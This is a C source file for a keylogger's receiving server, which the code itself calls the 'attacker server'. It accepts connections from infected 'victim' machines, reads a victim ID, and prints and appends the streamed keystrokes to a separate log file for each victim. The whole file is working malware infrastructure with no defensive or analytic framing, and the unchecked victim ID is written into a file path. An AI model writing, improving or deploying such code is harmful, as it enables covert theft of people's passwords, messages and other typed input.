#include "server.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/stat.h>
#include <errno.h>

/**
 * @brief Creates the logs directory
 * 
 * Creates a directory named "logs" with read/write/execute permissions. 
 * Ignores the error if the directory already exists
 */
void init_log_directory(void)
{
    if (mkdir("logs", 0777) == -1)
    {
        if (errno != EEXIST)
        {
            perror("mkdir logs");
        }
    }
}

/**
 * @brief Reads and parses the unique victim ID from the client connection
 * 
 * Reads data byte by byte until a newline is found, expecting an "ID:<hash>" 
 * format. Removes the "ID:" prefix to leave only the hash
 * 
 * @param sock         The socket file descriptor connected to the client
 * @param id_buf       Buffer to store the parsed victim ID
 * @param id_buf_size  The size of the provided buffer
 * @return 0 on success, -1 if the format is invalid or the connection fails
 */
int read_victim_id(int sock, char *id_buf, size_t id_buf_size)
{
    int idx = 0; // Index counter to track the current position in the buffer

    while (idx < (int)id_buf_size - 1)
    {
        char c;
        int ret = recv(sock, &c, 1, 0);
        if (ret <= 0)
        {
            return -1; // error or disconnect
        }

        if (c == '\n') // End of the ID message
        {
            id_buf[idx] = '\0'; // Replace the newline with a null terminator to finalize string
            break;
        }

        // Append the character to the buffer
        id_buf[idx++] = c;
    }

    // Expect format "ID:<id>"
    if (strncmp(id_buf, "ID:", 3) == 0)
    {
        // Shift the string left by 3 bytes to remove the "ID:" prefix
        // strlen(id_buf) - 2 moves the remaining characters and the '\0'
        memmove(id_buf, id_buf + 3, strlen(id_buf) - 2); // keep only the id part
        return 0;
    }

    return -1;
}

/**
 * @brief Thread routine to handle an individual client's data stream
 * 
 * Uses the victim ID to create a unique log file, then continuously receives
 * and appends keystrokes to both the terminal and the specific log file
 * 
 * @param arg Pointer to a client_info_t struct containing socket and IP details
 * @return NULL when the client disconnects or an error occurs.
 */
void *handle_client(void *arg)
{
    client_info_t *client = (client_info_t *)arg;
    char buffer[BUF_SIZE]; // stores the logs from recv
    char filename[FILENAME_LEN]; // log file name
    char victim_id[VICTIM_ID_LEN]; // the hash
    FILE *log_file;

    printf("(+) Client connected from %s:%d\n", client->client_ip, client->client_port);

    // Read victim ID from client (first line: "ID:<hash>")
    if (read_victim_id(client->socket_fd, victim_id, sizeof(victim_id)) < 0)
    {
        printf("(-) Failed to read victim ID from %s:%d\n", client->client_ip, client->client_port);
        close(client->socket_fd);
        free(client);
        pthread_exit(NULL);
    }

    printf("(+) Victim ID for %s:%d is %s\n", client->client_ip, client->client_port, victim_id);

    // Log file name based on victim ID
    snprintf(filename, sizeof(filename), "logs/%s.log", victim_id);

    log_file = fopen(filename, "a");
    if (!log_file)
    {
        perror("fopen log_file");
        close(client->socket_fd);
        free(client);
        pthread_exit(NULL);
    }

    while (1)
    {
        memset(buffer, 0, sizeof(buffer));

        int bytes_received = recv(client->socket_fd, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0)
        {
            printf("(-) Client %s:%d disconnected.\n", client->client_ip, client->client_port);
            break;
        }

        printf("%.*s", bytes_received, buffer);
        fflush(stdout);

        // Append to this client's log file
        fprintf(log_file, "%.*s", bytes_received, buffer);
        fflush(log_file);
    }

    fclose(log_file);
    close(client->socket_fd);
    free(client);
    pthread_exit(NULL);
}

/**
 * @brief Main function of the attacker server
 * 
 * Initializes the logs directory, binds to the specified port, and listens for
 * incoming connections. Spawns a new detached thread for every client that connects
 * 
 * @param argc Number of command line arguments
 * @param argv Array of command line argument strings
 * @return 0 on normal exit, 1 if socket creation or binding fails
 */
int main(int argc, char *argv[])
{
    int server_fd;
    struct sockaddr_in server_addr;
    int port = DEFAULT_PORT;

    for (int i = 1; i < argc; i++)
    {
        if (strcmp(argv[i], "-port") == 0)
        {
            port = atoi(argv[i + 1]);
            i++;
        }
    }

    init_log_directory();

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0)
    {
        perror("socket");
        return 1;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        perror("bind");
        close(server_fd);
        return 1;
    }

    if (listen(server_fd, BACKLOG) < 0)
    {
        perror("listen");
        close(server_fd);
        return 1;
    }

    printf("Server listening on port %d...\n", port);

    while (1)
    {
        struct sockaddr_in client_addr;
        socklen_t addrlen = sizeof(client_addr);
        int client_socket = accept(server_fd, (struct sockaddr *)&client_addr, &addrlen);
        if (client_socket < 0)
        {
            perror("accept");
            continue;
        }

        // Prevent race condition between the main server thread overwriting client_data on 
        // next loop iteration and for created thread to read that data before it changes
        client_info_t *client_data = malloc(sizeof(client_info_t));
        if (!client_data)
        {
            perror("malloc");
            close(client_socket);
            continue;
        }

        client_data->socket_fd = client_socket;
        client_data->client_port = ntohs(client_addr.sin_port);
        inet_ntop(AF_INET, &(client_addr.sin_addr), client_data->client_ip, INET_ADDRSTRLEN);

        pthread_t thread_id;
        if (pthread_create(&thread_id, NULL, handle_client, (void *)client_data) != 0)
        {
            perror("pthread_create");
            close(client_socket);
            free(client_data);
        }
        else
        {
            pthread_detach(thread_id);
        }
    }

    close(server_fd);
    return 0;
}